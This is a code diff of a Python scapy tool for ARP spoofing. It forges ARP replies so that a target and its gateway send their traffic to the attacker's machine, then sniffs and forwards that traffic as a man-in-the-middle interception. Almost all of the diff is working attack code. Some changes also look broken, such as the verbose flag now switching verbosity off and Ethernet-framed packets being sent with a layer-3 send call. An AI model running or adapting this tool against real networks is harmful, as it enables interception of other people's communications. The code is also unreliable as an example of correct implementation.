@@ -1,4 +1,4 @@
-from scapy.all import ARP, Ether, sr1, send, sendp, sniff, IP, get_if_hwaddr
+from scapy.all import ARP, Ether, sr1, send, sniff, IP, get_if_hwaddr
 import colorama, time, sys, subprocess, threading
 
 HELP_MESSAGE = f"""
@@ -50,10 +50,7 @@ def PopulateFields(parameters):
 			case '-p':
 				parameters["Interval"] = float(sys.argv[argument + 1])
 			case '-v':
-				parameters["Verbose"] = True
-			case '-vv':
-				parameters["Verbose"] = True
-				parameters["Verboser"] = True
+				parameters["Verbose"] = False
 			case '-h':
 				PrintHelp()
 	return parameters
@@ -71,39 +68,48 @@ def PrintMessage(message="", code=-1):
 			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
 			sys.exit()
 
-def GetMAC(destination, timeout, interface):
-	arp_request = ARP(pdst=destination)
-	response = sr1(arp_request, iface=interface, timeout=timeout, verbose=False)
+def GetMAC(destination, timeout):
+	arp_request = ARP(op=1, pdst=destination)
+	response = sr1(arp_request, timeout=timeout, verbose=False)
 
 	if response:
 		return response.hwsrc
-
 	return None
 
 def Reset(message, gateway, gateway_mac, target, target_mac):
+	gateway_carrier = Ether(dst=target_mac)
 	gateway_packet = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=gateway_mac, hwdst=target_mac)
-	target_packet  = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=target_mac,  hwdst=gateway_mac)
+	gateway_encapsulated = gateway_carrier / gateway_packet
+	
+	target_carrier = Ether(gateway_mac)
+	target_packet  = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=target_mac, hwdst=gateway_mac)
+	target_encapsulated = target_carrier / target_packet
 
-	sendp(gateway_packet, count=1, verbose=False)
-	sendp(target_packet,  count=1, verbose=False)
+	send(gateway_encapsulated, count=1, verbose=False)
+	send(target_encapsulated,  count=1, verbose=False)
 
 	PrintMessage((gateway_packet.summary(), target_packet.summary()), 0)
 	PrintMessage(message, -1)
 
 def Spoof(verbose, interval, gateway, gateway_mac, target, target_mac, attacker_mac):
+	gateway_carrier = Ether(dst=target_mac)
+	gateway_packet = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=attacker_mac, hwdst=target_mac)
+	gateway_encapsulated = gateway_carrier / gateway_packet
+	
+	target_carrier = Ether(gateway_mac)
+	target_packet  = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac)
+	target_encapsulated = target_carrier / target_packet
+	
 	while not stop_event.is_set():
-		gateway_packet = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=attacker_mac, hwdst=target_mac)
-		target_packet  = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac)
-		
 		if verbose:
 			PrintMessage((target_packet.summary(), gateway_packet.summary()), 0)
 
-		sendp(gateway_packet, count=1, verbose=False)
-		sendp(target_packet,  count=1, verbose=False)
+		send(gateway_encapsulated, count=1, verbose=False)
+		send(target_encapsulated,  count=1, verbose=False)
 
 		time.sleep(interval)
 
-def ForwardSent(verbose, target, interface):
+def ForwardSent(target, interface):
 	while not stop_event.is_set():
 		packet = sniff(filter="ip", iface=interface, count=1)[0]
 
@@ -111,11 +117,10 @@ def ForwardSent(verbose, target, interface):
 			continue
 
 		if packet[IP].src == target:
-			if verbose:
-				PrintMessage(f"(Sent) {packet.summary()}", 0)
-			send(packet, iface=interface, count=1, verbose=False)
+			PrintMessage(f"(Sent) {packet.summary()}", 0)
+			send(packet, count=1, verbose=False)
 
-def ForwardReceived(verbose, target, interface):
+def ForwardReceived(target, interface):
 	while not stop_event.is_set():
 		packet = sniff(filter="ip", iface=interface, count=1)[0]
 
@@ -123,6 +128,5 @@ def ForwardReceived(verbose, target, interface):
 			continue
 
 		if packet[IP].dst == target:
-			if verbose:
-				PrintMessage(f"(Received) {packet.summary()}", 0)
-			send(packet, iface=interface, count=1, verbose=False)
+			PrintMessage(f"(Received) {packet.summary()}", 0)
+			send(packet, count=1, verbose=False)
